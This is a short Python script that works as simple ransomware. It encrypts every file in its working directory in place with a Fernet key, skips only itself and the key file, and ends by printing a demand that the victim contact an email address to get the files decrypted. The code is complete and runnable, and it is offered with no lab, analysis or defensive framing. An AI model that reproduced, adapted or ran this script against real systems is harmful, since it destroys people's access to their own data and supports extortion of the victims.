import os
from cryptography.fernet import Fernet

files = []

# Loop through files in the directory and add them to the files list
for file in os.listdir():
    if file == "enc.py" or file == "thekey.key":
        continue  # Skip the script and the key file
    
    if os.path.isfile(file):
        files.append(file)

# Print the list of files to be encrypted
print("Files to be encrypted:", files)

# Generate a key for encryption
key = Fernet.generate_key()

# Save the encryption key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Initialize the Fernet object
cipher = Fernet(key)

# Encrypt each file in the files list
for file in files:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        
        # Encrypt the contents of the file
        contents_encrypted = cipher.encrypt(contents)
        
        # Write the encrypted contents back to the file
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
        print(f"File encrypted: {file}")
    
    except Exception as e:
        print(f"Error encrypting {file}: {e}")

# Final message
print("Your files have been encrypted. If you want to decrypt them, please contact me at  ss12345@gmail.com.")
